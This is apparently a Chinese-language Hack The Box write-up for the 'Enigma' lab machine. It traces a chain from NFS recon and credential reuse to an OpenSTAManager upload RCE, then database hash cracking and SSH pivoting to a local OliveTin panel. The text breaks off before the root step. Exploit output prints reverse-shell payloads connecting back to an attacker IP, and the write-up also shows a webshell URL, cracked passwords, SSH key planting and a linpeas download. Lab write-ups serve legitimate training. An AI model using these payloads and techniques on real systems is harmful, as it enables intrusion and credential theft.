# HTB Enigma 解題筆記

- 目標 IP:`10.129.63.67`
- 網域:`enigma.htb`
- 難度:Easy 

**攻擊路徑總覽**:NFS 匯出(onboarding PDF)→ IMAP 帳密(kevin)→ 密碼重複使用(sarah)→ OpenSTAManager 後台帳密 → 任意檔案上傳 RCE(CVE-2026-38751)→ `www-data` → 應用程式 DB 設定檔 → MySQL → `zz_users` 雜湊 → hashcat 破解 → `haris` → 本機服務枚舉(OliveTin, 1337)→ SSH pivot 轉發 → OliveTin password 型參數注入(CVE-2026-27626)→ `root`。

---

## 1. 資訊蒐集(Recon)

### 指令

```bash
rustscan -a 10.129.63.67 -- -sCV -Pn -oA rustscan
```
```
Nmap scan report for 10.129.63.67
Host is up, received user-set (0.061s latency).
Scanned at 2026-11-25 10:49:15 CST for 17s

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: PIPELINING CAPA RESP-CODES SASL UIDL TOP STLS AUTH-RESP-CODE
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33247/udp6  mountd
|   100005  1,2,3      46717/tcp   mountd
|   100005  1,2,3      47907/tcp6  mountd
|   100005  1,2,3      56616/udp   mountd
|   100021  1,3,4      33787/tcp   nlockmgr
|   100021  1,3,4      44251/tcp6  nlockmgr
|   100021  1,3,4      53628/udp   nlockmgr
|   100021  1,3,4      56612/udp6  nlockmgr
|   100024  1          36324/udp6  status
|   100024  1          37817/udp   status
|   100024  1          47929/tcp   status
|   100024  1          58505/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: ID LOGIN-REFERRALS have Pre-login more IMAP4rev1 post-login IDLE listed capabilities SASL-IR LOGINDISABLEDA0001 STARTTLS LITERAL+ ENABLE OK
993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: ID LOGIN-REFERRALS have Pre-login more IMAP4rev1 AUTH=PLAINA0001 post-login listed capabilities ENABLE SASL-IR LITERAL+ IDLE OK
995/tcp   open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA RESP-CODES USER UIDL TOP SASL(PLAIN) AUTH-RESP-CODE
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
33787/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
44541/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
46717/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
47929/tcp open  status   syn-ack ttl 63 1 (RPC #100024)
58281/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**觀察**:開放服務偏向 mail(pop3/imap)+ NFS/rpcbind,80 port 會重導向到 `enigma.htb`。NSE 自帶的 `rpcinfo` 腳本在 111 port 下就已經列出完整的 RPC 服務對應表,跟後面單獨跑 `rpcinfo -p` 的結果互相印證。

### Web 列舉

```bash
echo "10.129.63.67 enigma.htb" | sudo tee -a /etc/hosts
```
```
[sudo] password for kali:
10.129.63.67 enigma.htb
```

```bash
curl -I http://enigma.htb/
```
```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 25 Nov 2026 02:55:01 GMT
Content-Type: text/html
Content-Length: 31133
Last-Modified: Thu, 19 Feb 2026 20:16:05 GMT
Connection: keep-alive
ETag: "69976f85-799d"
Accept-Ranges: bytes
```

首頁 JS 檢查過,純前端特效(navbar 捲動效果、`animateStats` 數字跑馬燈、`IntersectionObserver` 淡入動畫、錨點平滑捲動),沒有 API 呼叫或敏感資訊,排除這條路。

---

## 2. NFS 列舉與匯出

**踩坑**:`rpcinfo` 不接受 `host:port` 格式。
```
❯ rpcinfo -p enigma.htb:111
enigma.htb:111: RPC: Unknown host
❯ rpcinfo -p enigma.htb
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  33028  mountd
    100005    1   tcp  44541  mountd
    100005    2   udp  54935  mountd
    100005    2   tcp  58281  mountd
    100005    3   udp  56616  mountd
    100005    3   tcp  46717  mountd
    100024    1   udp  37817  status
    100024    1   tcp  47929  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  53628  nlockmgr
    100021    3   udp  53628  nlockmgr
    100021    4   udp  53628  nlockmgr
    100021    1   tcp  33787  nlockmgr
    100021    3   tcp  33787  nlockmgr
    100021    4   tcp  33787  nlockmgr
```
只能給單純 hostname/IP,port 固定問 111,不能自己指定。輸出裡的 TCP port 跟最早 rustscan 掃到的高位 port(33787、44541、46717、47929、58281)完全對應——RPC 服務透過 portmapper 動態註冊 port,不是固定 port。

```bash
showmount -e enigma.htb
```
```
Export list for enigma.htb:
/srv/nfs/onboarding *
```

```
❯ mkdir nfs
```

> 查證說明:之後實際成功掛載用的那一次指令沒有被截取到(中間 scrollback 跳過了),只確認最終掛載成功、能進去看到檔案,不杜撰中間那一行的確切寫法。正確語法原則是 `mount -t <類型> <遠端>:<路徑> <本地掛載點>`。

```
❯ ls
New_Employee_Access.pdf
```
(在已掛載好的 `nfs` 目錄下看到的檔案,擁有者 uid/gid 0,mode `rw-r--r--`)

**踩坑(方向性,非指令錯誤)**:一度考慮直接往這個 NFS 匯出目錄塞 reverse shell webshell,想靠這個拿初始存取。確認後排除:(a) 該匯出只是唯讀的 onboarding 文件分享,沒有任何服務會執行這個目錄底下的檔案;(b) 就算檔案可寫,沒有觸發點也沒用。正確方向是看 PDF 內容本身的帳密,不是濫用掛載點本身。

---

## 3. 帳密收集

- PDF 內容:kevin 的 mail 帳密(IMAP/POP3 登入用)
- IMAP 登入 kevin 信箱,看到一封署名 **Sarah(Accounts Department)** 的信,提到帳密在 share disk(但 share disk 裡其實只有這份 PDF,是個迴圈/煙霧彈,沒有新資訊)
- **關鍵發現**:同一組密碼直接拿去試 Sarah 的帳號 → 密碼重複使用,登入成功
- Sarah 信箱裡找到 OpenSTAManager 後台的網址跟 admin 帳密

### 中途的錯誤連線嘗試(用於理解 IMAP/POP3 狀態機)

```bash
curl -kv pop3://enigma.htb:995
```
```
* Established connection to enigma.htb (10.129.63.67 port 995) from 10.10.15.130 port 43876
* server response timeout
* closing connection #0
curl: (28) server response timeout
```

```bash
curl -kv imaps://enigma.htb:993
```
```
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
> A001 CAPABILITY
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 LIST "" *
< A002 BAD Error in IMAP command received by server.
* shutting down connection #0
curl: (21) Quote command returned error
```
**觀念**:伺服器自己說了 `Pre-login capabilities listed, post-login capabilities have more.`——`LIST` 是登入後才能用的指令,還沒驗證身份就發會被 `BAD`。這不是連線問題,是指令跟目前驗證狀態不符,得先 `LOGIN`。

---

## 4. 初始存取:OpenSTAManager 任意檔案上傳 RCE(CVE-2026-38751)

用 admin 帳密登入 OpenSTAManager 後台(`http://support_001.enigma.htb/`,不是主站 `enigma.htb`)。

**漏洞原理(CVE-2026-38751)**:OpenSTAManager 的模組市集功能讓管理員上傳第三方模組——zip 包裡含一個 `MODULE` 描述檔(宣告模組名稱、版本等 metadata)跟模組本身的程式檔案。後台的「啟用更新」功能收到 zip 後,只檢查裡面有沒有格式正確的 `MODULE` 描述檔,沒有驗證模組來源是否可信(沒有簽章、沒有白名單),也沒有限制解壓後檔案的類型或副檔名,就直接把整包解壓到 web 可存取、且會被當成 PHP 執行的 `modules/<name>/` 目錄下。

換句話說,只要 zip 裡的 `MODULE` 描述檔長得合法,系統就會照單全收——所以在 zip 裡夾帶一個 `shell.php`,解壓後它就等於一個能用 URL 直接呼叫的 webshell(`modules/shell/shell.php`)。

本質是 **CWE-434(Unrestricted Upload of File with Dangerous Type)**:原本只該接受受信任模組的通道,因為缺乏內容驗證跟隔離,被用來任意寫入可執行檔到 webroot。因為「啟用更新/上傳模組」這個功能本身要先登入後台才能用,所以這是**後登入 RCE**,得搭配前面密碼重複使用拿到的 admin 帳密才能觸發,不是未驗證就能打的漏洞。

工具:`git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751`(Rust PoC)。已人工審查 `src/main.rs` 原始碼確認無惡意行為——只打目標 URL,reverse shell 監聽只綁定自己指定的 `--lhost`,沒有外部回傳/C2。

### 編譯環境踩坑

```
❯ cargo build --release
zsh: command not found: cargo
❯ sudo apt install cargo
Error: Failed to fetch http://http.kali.org/kali/pool/main/r/rustc/cargo_1.97.1%2bdfsg1-1_amd64.deb  404  Not Found
```
套件庫索引跟鏡像站版本不同步,先 `sudo apt update` 再重裝 `cargo` 才成功。

```
❯ cargo build --release
  Could not find openssl via pkg-config:
  The pkg-config command could not be found.
  openssl-sys = 0.9.117
```
`reqwest` 依賴 TLS,需要系統 OpenSSL 開發檔但沒裝 `pkg-config`:
```bash
sudo apt install pkg-config libssl-dev
```
裝完後 `cargo build --release` 成功。

### 執行 exploit

```
❯ ./openstamanager-rce-exploit --url http://support_001.enigma.htb/ -U admin -P Ne3s4rtars78s --lhost 10.10.15.130 --lport 4444

[ OpenSTAManager RCE Exploit : ]

Target: http://support_001.enigma.htb/
[*] Step 1: Login...
[+] Login successful: admin
[*] Step 2: Enable updates...
[+] Updates enabled
[*] Step 3: Create ZIP...
[*] Created in-memory ZIP file
[*] Shell location: /modules/shell/shell.php
[*] Step 4: Upload...
[*] Upload status: 500 Internal Server Error
[+] Upload successful
[*] Step 5: Verify...
[+] Vulnerability confirmed!
[+] Shell: http://support_001.enigma.htb/modules/shell/shell.php
[+] Test: http://support_001.enigma.htb/modules/shell/shell.php?c=whoami
[*] Listening on 10.10.15.130:4444...
[*] Trying payload: bash -c 'bash -i >& /dev/tcp/10.10.15.130/4444 0>&1'
[-] Payload failed: ... operation timed out
[*] Trying payload: python3 -c 'import socket,subprocess,os;...'
[-] Payload failed: ... operation timed out
[*] Trying payload: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
[+] Payload sent successfully. Waiting for connection...
[+] Connection received from 10.129.63.67:44002
[*] Sent 'script /dev/null -c bash'

bash: cannot set terminal process group (1560): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/modules/shell$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@enigma:~/html/openstamanager/modules/shell$
```
前兩個 reverse shell payload(bash `/dev/tcp`、python3)都 timeout 失敗,第三個(python2 語法)才成功連回監聽的攻擊機,顯示目標上 bash 的 `/dev/tcp` 可能被阻擋,或沒裝 python3 只有 python2。

**觀念**:不需要額外開 `nc -lvnp` 監聽——工具內部自己用 Rust `TcpListener::bind()` 監聽 `--lhost:--lport`,webshell 送出 payload 連回來後直接把終端 stdin/stdout 接上這條連線。

**結果**:取得 `www-data@enigma` 的 reverse shell。

---

## 5. 提權:www-data → haris

### 找到真正的資料庫設定檔

目錄下同時存在 `config.example.php`、`config.php`、`config.inc.php` 三個長得很像的檔案。

```bash
cat config.inc.php
```
```php
// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```
但另外兩個(`config.php`、`config.example.php`)裡的值是:
```
$db_username = '|username|';
$db_password = '|password|';
$db_name = '|database|';
```
**觀念**:`|username|`、`|password|` 這種是**未替換的佔位符**,是安裝範本檔,不是實際在跑的設定。`config.inc.php` 檔案時間是 Feb 18 2026,其他範本檔是 Dec 23 2025,時間差也是線索。

```
❯ cat config* | grep "password\|user\|name"
cat: config: Is a directory
$db_username = '|username|';
$db_password = '|password|';
$db_name = '|database|';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
$db_username = '|username|';
$db_password = '|password|';
$db_name = '|database|';
```
`cat: config: Is a directory` 是因為 `config*` 這個 glob 同時比對到一個叫 `config` 的資料夾(不是檔案),`cat` 對目錄會噴這個錯誤,但不影響同一行其他真正的檔案被正常讀取。

### 補充:這些設定檔是什麼、有哪些有用資訊

PHP 網站把「環境相關的設定」(資料庫位置、帳密、金鑰)獨立放進設定檔,程式啟動時讀取。檔名沒有統一標準,各專案自己決定,所以要**逐個打開看內容,不能只憑檔名判斷**。

| 檔案 | 通常是什麼 | 本題的實際情況 |
|---|---|---|
| `config.example.php` | 專案隨附的**範本**。安裝時要複製成真正的設定檔再填值,放在 repo 裡所以不含真實密碼 | 只有 `|username|`、`|password|` 佔位符 |
| `config.php` | 許多專案的**實際設定檔**(安裝後產生或手動填寫)。本題卻只是未填的範本 | 同樣是佔位符,沒有價值 |
| `config.inc.php` | 本專案(OpenSTAManager)**實際被讀取的設定檔**,安裝精靈完成後寫入 | 有真實的 DB 帳號、密碼、資料庫名 |
| `.env` | 另一種慣例(Laravel、Symfony、Node 等框架):以 `KEY=value` 存放環境變數,不寫成 PHP 程式碼。本題沒有這個檔案,但在其他靶機常見 | (本題未出現) |

**怎麼判斷哪個是真的:**

1. 內容:有沒有真實的值,而不是 `|username|`、`your_password`、`changeme`、`xxx` 這類佔位符。
2. 時間:`ls -la` 看修改時間。範本跟著原始碼一起部署,時間一致;安裝後寫入的檔案時間較晚(本題 `config.inc.php` 是 Feb 18 2026,範本是 Dec 23 2025)。
3. 讀取者:`grep -r "config.inc.php" .` 看程式實際 `include` 哪個檔案。

**這類檔案常見的有用資訊:**

- **資料庫連線**:`host`、`username`、`password`、`database`。本題就是由此連進 MySQL,再讀出使用者雜湊。
- **密碼重複使用**:資料庫密碼常和系統帳號(SSH、`su`)相同,取得後要拿去試其他服務(見 `Credential Reuse`)。
- **金鑰與 Secret**:`APP_KEY`、`JWT_SECRET`、session salt。可能用來偽造 token、session 或解密資料。
- **第三方服務憑證**:SMTP、API key、雲端 access key、LDAP 綁定帳號。
- **網站管理員資訊**:預設管理員帳號、安裝時設定的後台密碼。
- **內網資訊**:DB 主機是不是 `localhost`、有沒有其他內網主機與服務位置,可用於橫向移動。
- **除錯與路徑**:`DEBUG=true`、絕對路徑、log 位置,能協助後續利用。

**可以順便找的相近檔案:**

```bash
find /var/www -maxdepth 4 \( -name ".env*" -o -name "config*.php" -o -name "wp-config.php" -o -name "settings.php" -o -name "*.bak" -o -name "*.old" \) 2>/dev/null
grep -rIl "password" /var/www 2>/dev/null
```

`.env.bak`、`config.php.bak`、`config.php~` 這類備份檔常被編輯器或管理員遺留,而且常以純文字被 web server 直接提供(沒有被當成 PHP 執行),所以也是遠端可下載的目標。

**防禦面**:設定檔放在 web root 之外、權限限制為只有服務帳號可讀(`chmod 640`)、不要在多個服務共用同一組密碼。

### 連進 MySQL

```
❯ mysql -u brollin -pFri3nds@9099 openstamanager
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 269
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)
```
**觀念**:`mysql` 客戶端走的是 MySQL wire protocol,MariaDB 完全相容同一套協定,不用先確定伺服器端是哪一種才能連(這裡 banner 證實是真的 MySQL 8.0.46)。

### 找到使用者雜湊

**踩坑**:MySQL 互動模式的指令要以 `;` 結尾才會執行,沒加分號它會一直等繼續輸入(`->` 接續提示字元)。

```sql
mysql> show tables;
```
```
221 rows in set (0.00 sec)
```
(含 `zz_users`、`zz_settings`、`zz_modules` 等 221 張表;`em_` 開頭像 email 相關,`zz_` 開頭像系統核心/帳號管理)

```sql
mysql> use zz_users
```
```
ERROR 1044 (42000): Access denied for user 'brollin'@'localhost' to database 'zz_users'
```
**踩坑**:`USE` 是切換「資料庫」用的,`zz_users` 是**資料表**不是資料庫,連線時已經用 `mysql ... openstamanager` 指定好資料庫了,直接查表就好。

```sql
mysql> select * from zz_users;
```
```
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+
| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+
2 rows in set (0.00 sec)
```

**觀念**:雜湊格式本身就寫明演算法:`$2y$` 開頭代表 **bcrypt**,`10` 是 cost factor,格式固定 `$2y$<cost>$<鹽值+雜湊>`,不用查文件,看格式直接判斷,對應 hashcat 模式 `-m 3200`。

### 破解與切換使用者

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
用 rockyou 字典跑基礎字典攻擊,破解出 `haris` 的密碼:**`bestfriends`**。(`admin` 的雜湊完全沒拿去破解——admin 的網頁登入密碼 `Ne3s4rtars78s` 早就從 Sarah 信箱拿到了,跟資料庫裡這個雜湊是分開的兩件事,沒必要也沒嘗試去破它。)

```
haris@enigma:~$ sudo -i
[sudo] password for haris:
haris is not in the sudoers file. This incident has been reported to the administrator.
```
haris 不在 sudoers,確認死路。

```
haris@enigma:~$ ls
mail  user.txt
haris@enigma:~$ cat user.txt
7627c823e70b0c3e2778e08309e1de70
```

**User flag**:`7627c823e70b0c3e2778e08309e1de70`

---

## 6. 提權:haris → root

### linpeas 枚舉

目標機沒有直接網路出口抓 linpeas,先在 kali 本機開 HTTP server。

```
haris@enigma:~$ wget http://10.10.15.130/linpeas.sh
--2026-11-25 05:50:56--  http://10.10.15.130/linpeas.sh
Connecting to 10.10.15.130:80... failed: Connection refused.
```
**踩坑**:攻擊機當時根本沒開 HTTP server(不是防火牆擋,是沒服務)。

```bash
# kali 本機
sudo python3 -m http.server 80
```
```
haris@enigma:~$ wget http://10.10.15.130:8000/linpeas.sh
--2026-11-25 05:52:14--  http://10.10.15.130:8000/linpeas.sh
Connecting to 10.10.15.130:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1784298 (1.7M) [application/x-sh]
Saving to: 'linpeas.sh'
linpeas.sh          100%[===================>]   1.70M  3.52MB/s    in 0.5s
```
改用非特權 port 重試才成功。

```bash
chmod +x linpeas.sh
./linpeas.sh > /tmp/linpeas_out.txt 2>&1
grep -i "vulnerable\|CVE-\|writable\|password" /tmp/linpeas_out.txt
```
```
══╣ GNU C Library tunables package review (CVE-2023-4911) (T1068)
══╣ DiagSpill SCTP kernel exposure (CVE-2026-74469) (T1068)
Potentially vulnerable kernel 6.8.0-124-generic with SCTP diagnostics reachable
CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.36
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.91
CVE: CVE-2026-46331 | Name: pedit COW | Match data: pkg=linux-kernel,ver>=5.18,ver<6.12.94
CVE: CVE-2026-43499 | Name: GhostLock rtmutex UAF | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.86
══╣ nftables catchall verdict-map UAF (CVE-2026-23111) (T1068)
POTENTIALLY VULNERABLE to CVE-2026-23111 by upstream range; vendor backport status is unavailable
-rwsr-xr-x 1 root root 272K Mar  2  2026 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
══╣ Set-capabilities snap-confine (CVE-2026-8933) (T1068)
Vulnerable to CVE-2026-8933: set-capabilities snap-confine version 2.75.2+ubuntu24.04 permits local privilege escalation to root
══╣ snap-confine/tmpfiles race prerequisites (CVE-2026-3888) (T1068)
```
**觀念**:linpeas 用顏色分級(紅=高機率可用,黃=值得注意),輸出分區塊(`═╣ 區塊名`),建議先 `grep -n "═╣"` 列區塊索引,再針對關鍵字 `vulnerable|CVE-|writable|password` 搜,不整份從頭讀。

**觀念**:核心版本 CVE 清單幾乎全是「版本區間比對」的低可信度猜測(`Match data: pkg=linux-kernel,ver>=X,ver<Y` 格式),唯一寫法不同、直接斷言的是那行 `Vulnerable to CVE-2026-8933`——因為它比對的是**實際裝的套件版本**而非模糊核心版本區間,訊號強很多,決定先追這個方向。

### CVE-2026-8933 嘗試(死路,放棄)

```
haris@enigma:/tmp/CVE-2026-8933$ ls
include  Makefile  NOTES.md  poc  poc.c  README.md
haris@enigma:/tmp/CVE-2026-8933$ chmod +x poc
haris@enigma:/tmp/CVE-2026-8933$ ./poc
./poc: error while loading shared libraries: libfuse3.so.4: cannot open shared object file: No such file or directory
```
```
haris@enigma:/tmp/CVE-2026-8933$ find / -name "libfuse3*" 2>/dev/null
/usr/lib/x86_64-linux-gnu/libfuse3.so.3
/usr/lib/x86_64-linux-gnu/libfuse3.so.3.14.0
```
系統只有 `libfuse3.so.3.14.0`,作者編譯機版本跟目標環境不符。

```
haris@enigma:/tmp/CVE-2026-8933$ make
make: Nothing to be done for 'all'.
```
舊的 `poc` 二進位檔時間戳記比原始碼新,make 誤判已是最新不重編。

```
haris@enigma:/tmp/CVE-2026-8933$ make -B
cc -O2 -Wall -Wextra ... -o poc poc.c /usr/lib/x86_64-linux-gnu/libfuse3.so.3.17.4 -Wl,-rpath,/usr/lib/x86_64-linux-gnu
/usr/bin/ld: cannot find /usr/lib/x86_64-linux-gnu/libfuse3.so.3.17.4: No such file or directory
collect2: error: ld returned 1 exit status
make: *** [Makefile:6: poc] Error 1
```
`Makefile` 寫死要求 `libfuse3.so.3.17.4`,系統只有 `3.14.0`。確認這個 PoC 跟目標環境函式庫版本完全對不上,且這種需要精確匹配函式庫版本才能動的 kernel/snap exploit,通常不是 HTB 機器的正規解法。**放棄這條路**,轉回本機服務枚舉。

### 本機服務枚舉找到 OliveTin

```bash
ss -tlnp
```
```
LISTEN 0      100        127.0.0.1:25         0.0.0.0:*
LISTEN 0      4096         0.0.0.0:46717      0.0.0.0:*
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*
LISTEN 0      4096         0.0.0.0:44541      0.0.0.0:*
LISTEN 0      4096         0.0.0.0:58281      0.0.0.0:*
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*
LISTEN 0      100          0.0.0.0:993        0.0.0.0:*
LISTEN 0      100          0.0.0.0:995        0.0.0.0:*
LISTEN 0      64           0.0.0.0:33787      0.0.0.0:*
LISTEN 0      4096         0.0.0.0:47929      0.0.0.0:*
LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
LISTEN 0      100          0.0.0.0:143        0.0.0.0:*
LISTEN 0      64           0.0.0.0:2049       0.0.0.0:*
LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*
LISTEN 0      4096         0.0.0.0:111        0.0.0.0:*
LISTEN 0      100          0.0.0.0:110        0.0.0.0:*
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
```
`127.0.0.1:1337` 只綁 loopback,外部掃不到,也不是任何已知服務慣用 port(`33060` 認得出是 MySQL X Protocol,標準伴生 port,排除)。

```bash
nc -nv 127.0.0.1 1337
curl -I http://127.0.0.1:1337
```
```
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 2371
Content-Type: text/html; charset=utf-8
```

```bash
curl -s http://127.0.0.1:1337/
```
```html
<title>OliveTin</title>
<meta name = "description" content = "Give safe and simple access to predefined shell commands from a web interface." />
<script type="module" crossorigin src="/assets/index-Cr_VwSNJ.js"></script>
```
一個跑預設 shell 指令的 web 面板,只能內網連。

**觀念**:HTML 本身沒寫 API 字樣,是從 SPA 架構(JS 掛載空的 `#app`)推論一定有後端 endpoint。在 bundle 後的 JS(`/assets/index-Cr_VwSNJ.js`,壓成一行無法直接讀)裡找到實證:
```js
baseUrl:window.location.protocol+"//"+window.location.host+"/api/"
```

```bash
curl -s http://127.0.0.1:1337/api/GetDashboard
```
```
(空白回應)
```
OliveTin API 是 POST 不是 GET,改用 POST:

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{}' http://127.0.0.1:1337/api/GetDashboard
```
```json
{"title":"", "dashboard":{"title":"Actions", "contents":[{"title":"Actions", "type":"fieldset", "contents":[
... (以上省略其餘動作:Ping the Internet / Check disk space / check dmesg logs / date / Run backup script / Ping host / Restart Docker Container / Delete old backups / Get OliveTin Theme / Setup easy SSH / Restart httpd on server1 / Toggle GPIO light / Run Automation Playbook,均為原始回應裡的真實條目,這裡只節錄跟後續利用相關的那一條) ...
{"title":"Backup Database", "type":"link", "contents":[], "icon":"⛁", "cssClass":"", "action":{"bindingId":"backup_database", "title":"Backup Database", "icon":"⛁", "canExec":true, "arguments":[
  {"name":"db_user", "title":"db_user", "type":"ascii_identifier", "defaultValue":"backup_svc", "choices":[], "description":"", "suggestions":{}, "suggestionsBrowserKey":""},
  {"name":"db_pass", "title":"db_pass", "type":"password", "defaultValue":"", "choices":[], "description":"", "suggestions":{}, "suggestionsBrowserKey":""},
  {"name":"db_name", "title":"db_name", "type":"ascii_identifier", "defaultValue":"production", "choices":[], "description":"", "suggestions":{}, "suggestionsBrowserKey":""}
], "popupOnStart":"execution-dialog", "order":23, "timeout":3, "datetimeRateLimitExpires":""}, "entityType":"", "entityKey":""}
]}}
```
`db_pass` 參數型別是 `password`,跟其他 `ascii_identifier` 型別不同,是後續注入的切入點。

### 架設 SSH pivot(為了用瀏覽器 / 本機工具打到 OliveTin)

目標 sshd 設定 `PasswordAuthentication no`,只能金鑰登入。haris 無既有金鑰(`~/.ssh` 不存在),自己生成並植入。

```
❯ ssh-keygen -t ed25519 -f ./enigma_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in ./enigma_key
Your public key has been saved in ./enigma_key.pub
The key fingerprint is:
SHA256:Tx96rpZ3ZG0oBqV5e4CJkL9VqDFN7CYHBEs13Q2eZys kali@kali
❯ cat enigma_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII1Wy4BtlhGz89vgvQ+dKHtIM+Ch1ZaWpDgQwol7V2II kali@kali
```

```
haris@enigma:~$ mkdir -p ~/.ssh
haris@enigma:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII1Wy4BtlhGz89vgvQ+dKHtIM+Ch1ZaWpDgQwol7V2II kali@kali" >> .ssh/key
haris@enigma:~$ chmod 700 .ssh
haris@enigma:~$ chmod 600 .ssh/key
```
```
❯ ssh -L 8080:10.129.63.67:1337 haris@10.129.63.67
haris@10.129.63.67: Permission denied (publickey).
```
**踩坑**:公鑰寫進了 `~/.ssh/key`(自取檔名)。OpenSSH 預設只讀取固定檔名 `~/.ssh/authorized_keys`,寫成別的檔名伺服器不會檢查。修正:
```bash
mv ~/.ssh/key ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

```
❯ ssh -L 8000:10.129.63.67:1337 haris@10.129.63.67 -i enigma_key
Last login: Wed Nov 25 07:46:07 2026 from 10.10.15.130
haris@enigma:~$ channel 3: open failed: connect failed: Connection refused
channel 3: open failed: connect failed: Connection refused
(重複數十次)
```
**踩坑**:金鑰登入成功了,但轉發目標寫錯。`-L local_port:target_host:target_port` 的 `target_host` 是從**遠端 sshd 自己的角度**連出去,不是本機視角。OliveTin 只綁遠端自己的 `127.0.0.1`,不是對外 IP `10.129.63.67`,所以遠端伺服器連自己的 `10.129.63.67:1337` 必然 refused。

```
❯ ssh -L 8000:127.0.0.1:1337 haris@10.129.63.67 -i enigma_key
Last login: Wed Nov 25 07:47:38 2026 from 10.10.15.130
haris@enigma:~$ exit
logout
Connection to 10.129.63.67 closed.
```
**踩坑**:改對 host 後直接在 session 裡打 `exit`,把整條連線關掉,連帶轉發也死了(轉發依賴連線存活,不能關)。改用 `-N`(不開遠端 shell,純轉發)+ `-f`(背景執行):

```bash
ssh -L 8000:127.0.0.1:1337 haris@10.129.63.67 -i enigma_key -N -f
```
轉發成功後,本機 `127.0.0.1:8000` 等於直通目標的 OliveTin。

### CVE-2026-27626 利用

確認版本:OliveTin 3000.10.0,對應 `CVE-2026-27626`(`password` 型參數注入繞過)。
